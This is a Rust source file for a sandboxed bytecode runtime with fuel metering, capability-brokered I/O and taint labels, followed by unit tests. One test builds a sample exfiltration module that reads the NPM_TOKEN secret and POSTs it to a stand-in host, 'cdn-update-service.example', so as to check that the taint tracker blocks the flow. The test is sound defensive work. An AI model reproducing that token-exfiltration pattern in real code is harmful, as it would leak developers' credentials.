use omc_cap::{CapabilityBroker, Policy, Trap};
use omc_format::{CapOp, CellId, Function, Module, Op, TrapCode, Value};
use omc_taint::{Label, Labeled};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fuel(u64);

impl Fuel {
    pub fn new(units: u64) -> Self {
        Self(units)
    }

    fn consume(&mut self, units: u64) -> Result<(), Trap> {
        if self.0 < units {
            return Err(Trap::new(TrapCode::FuelExhausted, "cell exhausted fuel"));
        }
        self.0 -= units;
        Ok(())
    }
}

#[derive(Debug, Clone)]
pub struct Cell {
    pub id: CellId,
    pub module: Module,
    pub policy: Policy,
    pub fuel: Fuel,
}

impl Cell {
    pub fn new(id: CellId, module: Module, policy: Policy) -> Self {
        Self {
            id,
            module,
            policy,
            fuel: Fuel::new(10_000),
        }
    }
}

pub fn run_cell(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    let function = cell
        .module
        .entry()
        .ok_or_else(|| Trap::new(TrapCode::InvalidFunction, "module has no entry function"))?
        .clone();

    run_function(cell, broker, &function, args)
}

fn run_function(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    function: &Function,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    let mut stack = Vec::<Labeled<Value>>::new();
    let mut locals = vec![Labeled::public(Value::Unit); function.locals as usize];

    for op in &function.code {
        cell.fuel.consume(1)?;

        match op {
            Op::Const(value) => stack.push(Labeled::public(value.clone())),
            Op::LoadArg(index) => {
                let value = args.get(*index as usize).cloned().ok_or_else(|| {
                    Trap::new(TrapCode::StackUnderflow, format!("missing arg {index}"))
                })?;
                stack.push(value);
            }
            Op::StoreLocal(id) => {
                let value = pop(&mut stack)?;
                let local = locals.get_mut(*id as usize).ok_or_else(|| {
                    Trap::new(TrapCode::InvalidLocal, format!("invalid local {id}"))
                })?;
                *local = value;
            }
            Op::LoadLocal(id) => {
                let value = locals.get(*id as usize).cloned().ok_or_else(|| {
                    Trap::new(TrapCode::InvalidLocal, format!("invalid local {id}"))
                })?;
                stack.push(value);
            }
            Op::Add => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(add(left, right)?);
            }
            Op::Sub => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(sub(left, right)?);
            }
            Op::Eq => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                let label = left.label.join(right.label);
                stack.push(Labeled::new(Value::Bool(left.value == right.value), label));
            }
            Op::Len => {
                let value = pop(&mut stack)?;
                let len = match value.value {
                    Value::String(value) => value.len(),
                    Value::Array(value) => value.len(),
                    other => {
                        return Err(Trap::type_error(format!(
                            "len expected string or array, got {}",
                            other.type_name()
                        )))
                    }
                };
                stack.push(Labeled::new(Value::Int(len as i64), value.label));
            }
            Op::Slice => {
                return Err(Trap::new(
                    TrapCode::HostError,
                    "slice is reserved but not implemented yet",
                ));
            }
            Op::CallLocal(id) => {
                let callee = cell
                    .module
                    .function(*id)
                    .ok_or_else(|| Trap::new(TrapCode::InvalidFunction, "unknown function"))?
                    .clone();
                let mut call_args = Vec::new();
                for _ in 0..callee.args {
                    call_args.push(pop(&mut stack)?);
                }
                call_args.reverse();
                let result = run_function(cell, broker, &callee, call_args)?;
                stack.push(result);
            }
            Op::CallImport(_) => {
                return Err(Trap::new(
                    TrapCode::HostError,
                    "imports must be linked through capability calls",
                ))
            }
            Op::Cap(cap) => {
                let result = execute_cap(cell, broker, cap, &mut stack)?;
                stack.push(result);
            }
            Op::Return => return Ok(stack.pop().unwrap_or_else(|| Labeled::public(Value::Unit))),
            Op::Trap(code) => {
                return Err(Trap::new(code.clone(), "explicit OMC trap"));
            }
        }
    }

    Ok(Labeled::public(Value::Unit))
}

fn execute_cap(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    cap: &CapOp,
    stack: &mut Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    match cap {
        CapOp::EnvRead { name } => broker.read_env(cell.id, &cell.policy, name),
        CapOp::FsRead { path } => broker.read_file(cell.id, &cell.policy, path),
        CapOp::FsWrite {
            path,
            value_from_stack,
        } => {
            let value = if *value_from_stack {
                pop(stack)?
            } else {
                Labeled::public(Value::Unit)
            };
            broker.write_file(cell.id, &cell.policy, path, value)
        }
        CapOp::HttpRequest { request } => {
            let body = if request.body_from_stack {
                pop(stack)?
            } else {
                Labeled::public(Value::Unit)
            };
            broker.http_request(cell.id, &cell.policy, request, body)
        }
        CapOp::DnsLookup { host } => Ok(Labeled::new(
            Value::String(host.clone()),
            Label::Network(host.clone()),
        )),
        CapOp::TimeNow => Ok(Labeled::public(Value::Int(0))),
        CapOp::RandomBytes { len } => Ok(Labeled::public(Value::Array(vec![Value::Int(0); *len]))),
        CapOp::ProcSpawn { command, args } => {
            broker.spawn_process(cell.id, &cell.policy, command, args)?;
            unreachable!("spawn_process returns Never on success")
        }
        CapOp::DynamicEval { .. } => Err(Trap::denied("dynamic eval denied by runtime")),
    }
}

fn pop(stack: &mut Vec<Labeled<Value>>) -> Result<Labeled<Value>, Trap> {
    stack
        .pop()
        .ok_or_else(|| Trap::new(TrapCode::StackUnderflow, "stack underflow"))
}

fn add(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(left), Value::Int(right)) => Ok(Labeled::new(Value::Int(left + right), label)),
        (Value::String(left), Value::String(right)) => {
            Ok(Labeled::new(Value::String(format!("{left}{right}")), label))
        }
        (left, right) => Err(Trap::type_error(format!(
            "add expected int+int or string+string, got {}+{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

fn sub(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(left), Value::Int(right)) => Ok(Labeled::new(Value::Int(left - right), label)),
        (left, right) => Err(Trap::type_error(format!(
            "sub expected int-int, got {}-{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

#[cfg(test)]
mod tests {
    use omc_cap::{Capability, MemoryBroker, Policy};
    use omc_format::{BehaviorType, CapOp, Function, HttpRequest, Module, Op};

    use super::*;

    #[test]
    fn pure_add_runs_without_broker_access() {
        let module = Module {
            id: "test:add".to_owned(),
            package: "add".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "add",
                2,
                vec![Op::LoadArg(0), Op::LoadArg(1), Op::Add, Op::Return],
            )],
        };
        let mut cell = Cell::new(1, module, Policy::pure());
        let mut broker = MemoryBroker::new();
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![
                Labeled::public(Value::Int(2)),
                Labeled::public(Value::Int(3)),
            ],
        )
        .unwrap();

        assert_eq!(result.value, Value::Int(5));
        assert_eq!(result.label, Label::Public);
    }

    #[test]
    fn runtime_traps_illegal_secret_flow() {
        let module = Module {
            id: "test:exfil".to_owned(),
            package: "exfil".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::HostCapability,
            functions: vec![Function::new(
                0,
                "exfil",
                0,
                vec![
                    Op::Cap(CapOp::EnvRead {
                        name: "NPM_TOKEN".to_owned(),
                    }),
                    Op::Cap(CapOp::HttpRequest {
                        request: HttpRequest::post(
                            "https://cdn-update-service.example/a",
                            "cdn-update-service.example",
                        ),
                    }),
                    Op::Return,
                ],
            )],
        };
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ));
        let mut cell = Cell::new(1, module, policy);
        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");

        let err = run_cell(&mut cell, &mut broker, vec![]).unwrap_err();
        assert!(err.message.contains("env:NPM_TOKEN may not flow"));
    }
}
